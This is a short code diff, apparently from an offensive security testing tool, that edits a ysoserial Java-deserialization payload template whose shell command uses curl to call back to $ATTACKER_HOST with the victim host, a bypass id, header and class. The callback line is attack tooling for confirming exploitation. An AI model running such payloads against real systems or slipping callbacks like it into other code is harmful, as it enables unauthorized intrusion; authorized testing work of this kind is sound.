@@ -12,7 +12,7 @@ from horrors import (
 
 class YsoserialPayload(templates.Template):
     template_context = {
-        'SHELL_EXEC': 'curl \"http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST&bypass_id=$BYPASS_ID\"',
+        'SHELL_EXEC': 'curl \"http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST&bypass_id=$BYPASS_ID&header=$HEADER&type=$CLASS\"',
     }
 
     PAYLOAD_CLASSES = [
